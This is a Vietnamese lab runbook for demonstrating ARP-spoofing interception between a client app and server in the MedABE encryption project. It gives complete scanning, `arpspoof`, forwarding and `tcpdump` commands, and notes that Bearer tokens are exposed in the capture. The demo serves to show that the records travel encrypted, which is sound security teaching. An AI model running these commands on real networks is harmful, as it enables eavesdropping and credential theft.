# Lệnh demo nghe lén (Kali) — MedABE

Dùng cho **mạng lab và thiết bị của chính nhóm demo**. Toàn bộ lệnh gõ trên **máy tấn công (Kali)**, trừ Bước 6 làm trên MacBook.

## Mô hình 3 máy

| Máy | Vai trò | IP |
|---|---|---|
| Kali (máy tấn công) | Dò thiết bị → ARP spoofing → bắt gói | tự xem ở Bước 0 |
| Windows (server) | Chạy server + `KSK.exe`, cổng 8090 | **10.146.105.100** |
| MacBook (nhập liệu) | App nhân viên, lưu/đọc hồ sơ giả | **10.146.105.132** |

> IP ở trên **đã xác nhận đúng ngày 25/10** (Mac `.132` đang kết nối server `.100:8090`). Nếu đổi Wi-Fi hoặc khởi động lại máy, IP có thể đổi → dò lại Bước 0–1 rồi thay số trong các lệnh.

## Chuẩn bị trước (bắt buộc)

- [ ] Cả 3 máy **cùng một Wi-Fi** `10.146.105.x`.
- [ ] Kali chạy trong VMware để chế độ **Bridged** (không phải NAT).
- [ ] Server Windows mở `KSK.exe`, giữ chạy.
- [ ] Mac mở app nhân viên, đăng nhập, chọn sẵn 1 **hồ sơ dữ liệu giả** (chưa bấm Lưu).
- [ ] Trên Kali mở **2 cửa sổ Terminal**: gọi là **Terminal 1** (spoofing) và **Terminal 2** (bắt gói).

---

## Bước 0 — Kali: xem IP và card mạng của mình

```bash
ip -br addr
```

```bash
ip route
```

Ghi lại tên card (ví dụ `eth0`). **Nếu card không phải `eth0`, thay vào tất cả lệnh bên dưới.**

---

## Bước 1 — Kali: dò thiết bị, xác nhận Mac & server

```bash
sudo arp-scan --interface=eth0 --localnet
```

```bash
sudo nmap -sT --open -p 8090,8095,9001-9003 10.146.105.0/24
```

Máy mở các cổng trên là server (mong đợi `10.146.105.100`). Tìm MacBook:

```bash
avahi-browse --all --resolve --terminate
```

Chỉ đi tiếp khi xác nhận **Mac = 10.146.105.132**, **server = 10.146.105.100**.

---

## Bước 2 — Kali / **Terminal 2**: bắt gói (chạy trước, giữ nguyên)

```bash
sudo tcpdump -i eth0 -nn -s 0 -U -w /tmp/medabe-demo.pcap 'host 10.146.105.132 and host 10.146.105.100 and tcp port 8090'
```

Thấy `listening on eth0` là đang chờ gói. **Để Terminal 2 chạy, không đóng.**

---

## Bước 3 — Kali / **Terminal 1**: lưu cấu hình mạng gốc (chạy 1 lần)

```bash
sysctl net.ipv4.ip_forward net.ipv4.conf.all.send_redirects net.ipv4.conf.eth0.send_redirects > "$HOME/medabe-network-before.conf"
```

---

## Bước 4 — Kali / **Terminal 1**: bật chuyển tiếp gói

```bash
sudo sysctl -w net.ipv4.ip_forward=1 net.ipv4.conf.all.send_redirects=0 net.ipv4.conf.eth0.send_redirects=0
```

Mong đợi: `ip_forward = 1`, hai `send_redirects = 0`.

---

## Bước 5 — Kali / **Terminal 1**: ARP spoofing đúng cặp Mac ↔ server

```bash
sudo arpspoof -i eth0 -t 10.146.105.132 -r 10.146.105.100
```

Giữ Terminal 1 chạy. Thấy các dòng `arp reply ... is-at ...` là đang gửi ARP giả.

---

## Bước 6 — Trên MacBook: tạo lưu lượng thật

Trong lúc Terminal 1 (Bước 5) và Terminal 2 (Bước 2) đang chạy:

1. Mở hồ sơ dữ liệu giả → **Sửa** → nhập giá trị mới (ví dụ chiều cao / cân nặng) → **Lưu**, chờ báo thành công.
2. Tải lại hồ sơ đó để tạo thêm lưu lượng đọc.

---

## Bước 7 — Kali: dừng và KHÔI PHỤC mạng (bắt buộc)

1. **Terminal 1:** nhấn **Ctrl+C** để dừng `arpspoof` (chờ nó gửi ARP phục hồi).
2. **Terminal 1:** hoàn nguyên cấu hình mạng:

   ```bash
   sudo sysctl -p "$HOME/medabe-network-before.conf"
   ```

3. **Terminal 2:** nhấn **Ctrl+C** để đóng file PCAP. Đọc số `packets captured` (phải > 0).
4. Kiểm tra app Mac còn kết nối server.

---

## Bước 8 — Kali: xem bằng chứng trong Wireshark

Cho tài khoản Kali đọc được file:

```bash
sudo chown "$(id -u):$(id -g)" /tmp/medabe-demo.pcap
```

Mở Wireshark:

```bash
wireshark /tmp/medabe-demo.pcap
```

Dán vào ô **Display filter của Wireshark** (không gõ ở Terminal) — xem phản hồi đọc hồ sơ:

```text
http.request.uri contains "/api/records"
```

Chọn 1 request → chuột phải → **Follow → TCP Stream** → trong stream dùng **Find** tìm chữ:

```text
ciphertext
```

Muốn xem request lưu hồ sơ (POST):

```text
http.request.method == "POST" && tcp.port == 8090
```

Lưu bằng chứng ra khỏi `/tmp` (file trong `/tmp` mất khi khởi động lại):

```bash
cp /tmp/medabe-demo.pcap "$HOME/medabe-demo-$(date +%Y%m%d-%H%M%S).pcap"
```

---

## Lời trình bày (gợi ý)

> "Tôi dò thiết bị trong mạng lab, xác định MacBook và server, rồi dùng Kali chuyển hướng và bắt lưu lượng giữa hai máy. Wireshark cho thấy hồ sơ trong phản hồi của server là **ciphertext** — bị bắt trên đường truyền nhưng không đọc được nội dung. App có khóa/thuộc tính ABE phù hợp mới giải mã để hiển thị."

## Lưu ý quan trọng

- Bắt được gói **không** = phá được AES/ABE. Chỉ chứng minh quan sát thấy **bản mã** trên đường truyền.
- Do dùng HTTP thuần, token `Authorization: Bearer ...` lộ trong PCAP → **che token** khi chụp slide; coi file `.pcap` là dữ liệu nhạy cảm.

## Xử lý nhanh khi lỗi

| Hiện tượng | Cách xử lý |
|---|---|
| `arpspoof` chạy nhưng PCAP không có hồ sơ | Làm **Bước 7** ngay. Kiểm tra lại IP/card, chế độ Bridged, Mac có đang trỏ đúng server `.100` không |
| App Mac mất kết nối sau Bước 5 | Làm **Bước 7** ngay để khôi phục mạng |
| Nmap chỉ thấy server, không thấy Mac | Bình thường — Mac không mở cổng server. Dùng `arp-scan` / `avahi-browse` để tìm Mac |
| Card Kali không phải `eth0` | Thay tên card đúng (xem Bước 0) vào mọi lệnh |
